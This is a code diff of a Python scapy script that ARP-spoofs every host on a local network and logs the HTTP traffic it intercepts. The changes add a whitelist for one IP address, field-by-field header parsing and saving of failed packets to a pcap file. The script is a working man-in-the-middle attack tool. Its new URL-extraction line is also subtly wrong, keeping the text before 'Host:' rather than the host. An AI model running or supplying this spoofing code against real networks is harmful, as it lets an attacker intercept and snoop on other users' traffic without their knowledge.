@@ -36,10 +36,18 @@ def handle_Packet(pkt):
             if 80 == pkt[TCP].dport: #check if packet is http packet
                 #pkt.show()
                 logging.info("HTTP:"+ pkt.summary())
-                logging.info(ls(pkt))
                 try:
-                    url=str(pkt[Raw]).split('Host:')[1].split('\\r\\n')[0]
-                    logging.info("URL:"+url)
+                    fields=str(pkt[Raw]).split('\r\n') #split into packet fields
+                    logging.info(str(fields))
+                    for field in fields:
+                        if 'Host:' in field:        #if Host field exctract url
+                            url=field.split('Host:')[0]
+                            break
+                    if (url != None):
+                        logging.info("URL:"+url)
+                    else:
+                        logging.warning('could not extract url') #save packets that cause errors
+                        wrpcap('error.pcap',pkt)
                 except Exception as exc:
                     logging.info('failed to extract url, '+str(exc))
 
@@ -62,15 +70,15 @@ def arpSpoof(router,localHost):
     """
     every 30 seconds send ARP broadcast to spoof all machines on LAN
     """
-
+    whitelist=['10.30.58.202',]
     while True:
         if len(localAddresses)>0:
             addressesLock.acquire()
             print 'spoofing',str(len(localAddresses))
             for host in localAddresses:
-                if host != router and host != localHost: #check that ip does not match default gateway or local host to not send packets to them
+                if host != router and host != localHost and host not in whitelist: #check that ip does not match default gateway or local host to not send packets to them
 
-                    victimPacket = Ether()/ARP(op=2,psrc = router, pdst=host)#creante arp packets
+                    victimPacket = Ether()/ARP(op=2,psrc = router, pdst=host)#create arp packets
                     gatewayPacket=Ether()/ARP(op=2,psrc=host,pdst=router)
                     logging.debug('spoofing: '+victimPacket[ARP].pdst)
                     sendp(victimPacket,verbose=0)#send packets
